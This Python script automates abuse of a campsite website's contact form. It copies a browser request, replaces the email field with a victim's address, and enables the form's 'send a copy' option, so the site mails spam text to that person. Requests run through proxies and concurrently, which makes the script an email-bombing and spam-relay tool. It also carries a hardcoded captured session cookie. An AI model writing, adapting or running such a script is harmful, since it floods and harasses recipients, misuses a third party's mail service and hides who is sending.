from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': '476c1650d1201b7a209a5974282a5c73',
    'compteur_visite': '2023-03-01+06%3A06%3A52',
    'lang': 'fr',
}

headers = {
    'authority': 'www.camping-amazigh.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryhsO6vEfxnVLRPacC',
    # 'cookie': 'PHPSESSID=476c1650d1201b7a209a5974282a5c73; compteur_visite=2023-03-01+06%3A06%3A52; lang=fr',
    'origin': 'https://www.camping-amazigh.com',
    'pragma': 'no-cache',
    'referer': 'https://www.camping-amazigh.com/contact.php?page=email-11&lang=enE-mail',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

params = {
    'page': 'email-11',
    'lang': 'enE-mail',
    'form745741810': '1',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryhsO6vEfxnVLRPacC\r\nContent-Disposition: form-data; name="conf"\r\n\r\nok\r\n------WebKitFormBoundaryhsO6vEfxnVLRPacC\r\nContent-Disposition: form-data; name="nom"\r\n\r\ntest\r\n------WebKitFormBoundaryhsO6vEfxnVLRPacC\r\nContent-Disposition: form-data; name="adresse"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryhsO6vEfxnVLRPacC\r\nContent-Disposition: form-data; name="Telephone"\r\n\r\ntest\r\n------WebKitFormBoundaryhsO6vEfxnVLRPacC\r\nContent-Disposition: form-data; name="Sujet"\r\n\r\ntest\r\n------WebKitFormBoundaryhsO6vEfxnVLRPacC\r\nContent-Disposition: form-data; name="Message"\r\n\r\ntest\r\n------WebKitFormBoundaryhsO6vEfxnVLRPacC\r\nContent-Disposition: form-data; name="bouton"\r\n\r\nSend\r\n------WebKitFormBoundaryhsO6vEfxnVLRPacC\r\nContent-Disposition: form-data; name="envoi_copie"\r\n\r\n1\r\n------WebKitFormBoundaryhsO6vEfxnVLRPacC--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text()).encode()

        response = requests.post('https://www.camping-amazigh.com/contact.php', params=params, cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    s = 'Message envoyé'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(5)


if __name__ == '__main__':
    main()
